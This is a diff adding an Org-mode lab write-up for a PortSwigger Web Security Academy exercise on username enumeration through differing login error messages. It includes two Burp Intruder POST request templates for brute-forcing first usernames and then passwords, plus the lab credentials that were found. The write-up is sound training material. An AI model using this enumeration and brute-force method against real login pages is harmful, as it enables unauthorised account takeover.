@@ -1,0 +1,89 @@
+#+title: Username enumeration via different responses
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+
+* Lab contains
++ Vulnerable to username enumeration and paassword brute-force attack
++ Wordlist for username and password
+* End Goal
++ Enumerate valid ~usename~ and ~password~ and login into their account.
+* DONE Download given wordlist ~username~ & ~password~ files
+CLOSED: [2023-07-31 Mon 17:40]
+* DONE Enumerate username first
+CLOSED: [2023-07-31 Mon 18:03]
++ Go to login page
++ Insert test login credential like username = ~test~ , password = ~test~
++ Intercept the request to ~burpsuite~
++ Observe the error message on invalid username.
++ Application giving error message ~Invalid username~
++ Go to burpsuite intruder and brute-force the ~username~ with given ~username~ wordlist and filterout by error message ~Invalid username~
++ In intruder of burpsuite
+  #+begin_src shell
+  POST /login HTTP/2
+  Host: 0a3a00a7036b3e42800edace007a00e8.web-security-academy.net
+  Cookie: session=dyDpQiTG4lyQZrjPkQUbfZRrqhXOeUtW
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 27
+  Origin: https://0a3a00a7036b3e42800edace007a00e8.web-security-academy.net
+  Dnt: 1
+  Referer: https://0a3a00a7036b3e42800edace007a00e8.web-security-academy.net/login
+  Upgrade-Insecure-Requests: 1
+  Sec-Fetch-Dest: document
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-User: ?1
+  Sec-Gpc: 1
+  Te: trailers
+
+  username=§test§&password=test
+#+end_src
++ So, Here is result from ~username~ enumeration. We can see that for invalid ~username~ it give a message ~Invalid username~. But for a particular ~username~ it gives a message ~Incorrect password~. So we can assume that it is the correct ~username~ but for that ~username~ it is incorrect ~password~
+  [[./assets/screenshots/lab01-enum-username.png]]
+  /So the username = ai/
+  /Can be different on every new instance of lab/
+
+* DONE Enumerate password for found username
+CLOSED: [2023-07-31 Mon 18:21]
+We found that username = ~ai~
++ Now brute-force same request but replace ~username=test~ with ~username=ai~ and brute-force ~password~ parameter
++ Use given password wordlist
+#+begin_src shell
+  POST /login HTTP/2
+Host: 0ab80093032551e78032a44a005a0038.web-security-academy.net
+Cookie: session=tDb3th4OBivAXgtGqBJruonwAvbtvDBK
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Origin: https://0ab80093032551e78032a44a005a0038.web-security-academy.net
+Dnt: 1
+Referer: https://0ab80093032551e78032a44a005a0038.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Sec-Gpc: 1
+Te: trailers
+
+username=ai&password=§test§
+#+end_src
+
+[[./assets/screenshots/lab01-enum-password.png]]
+
+/For every payload it shows Incorrect password except one that is our correct password/
+
+So, password for username ~ai~ is ~121212~
+
+* DONE Solve the Lab
+CLOSED: [2023-07-31 Mon 18:22]
+Login with found credential to solve the lab
++ username = ~ai~
++ password = ~121212~
+ 
+/Might be changed on every new instance of lab/
